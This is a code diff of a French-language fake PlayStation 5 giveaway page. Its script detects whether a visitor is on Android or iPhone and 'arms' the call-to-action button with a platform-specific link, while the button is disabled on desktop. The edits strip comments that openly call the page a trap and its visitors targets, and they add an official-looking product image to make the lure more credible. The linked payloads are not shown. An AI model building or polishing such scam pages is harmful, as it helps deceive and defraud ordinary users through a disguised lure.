@@ -9,7 +9,7 @@
         .container { background-color: white; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.2); text-align: center; max-width: 420px; padding: 30px; border: 1px solid #ddd; }
         h1 { color: #1c1e21; margin-bottom: 10px; font-size: 26px; font-weight: 700; }
         p { color: #606770; font-size: 17px; margin-bottom: 25px; line-height: 1.5; }
-        .ps5-img { max-width: 70%; margin-bottom: 20px; }
+        .ps5-img { max-width: 80%; margin-bottom: 20px; }
         .cta-button { display: block; width: 100%; box-sizing: border-box; padding: 16px; font-size: 18px; font-weight: bold; color: white; background-color: #0070d1; border: none; border-radius: 8px; cursor: pointer; text-decoration: none; transition: background-color 0.3s; }
         .cta-button:hover { background-color: #005eb8; }
         .timer { font-size: 18px; font-weight: bold; color: #d93025; margin-top: 20px; }
@@ -17,7 +17,8 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://media.direct.playstation.com/is/image/psd/PS5-console-front" alt="PlayStation 5" class="ps5-img">
+        <img src="https://gmedia.playstation.com/is/image/gmedia/ps5-product-thumbnail-01-en-14sep21" alt="PlayStation 5" class="ps5-img">
+        
         <h1>Félicitations !</h1>
         <p>Vous avez été présélectionné pour recevoir la nouvelle <strong>PlayStation 5</strong>. Terminez la dernière étape pour confirmer votre participation au tirage au sort officiel.</p>
         <a href="#" class="cta-button" id="cta-link">CONFIRMER MA PARTICIPATION</a>
@@ -48,16 +49,10 @@
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
             if (/android/i.test(userAgent)) {
-                // Si c'est un Android, on arme le lien Android.
                 ctaLink.href = lienAndroid;
-                console.log("Cible Android détectée. Armement du lien Android.");
             } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                // Si c'est un iPhone/iPad, on arme le lien iPhone.
                 ctaLink.href = lienIphone;
-                console.log("Cible iOS détectée. Armement du lien iPhone.");
             } else {
-                // Pour tout le reste (PC, Mac...), on désactive le piège.
-                console.log("Cible non mobile détectée. Piège désactivé.");
                 ctaLink.innerText = 'Offre disponible sur mobile uniquement';
                 ctaLink.style.backgroundColor = '#a0a0a0';
                 ctaLink.style.cursor = 'not-allowed';
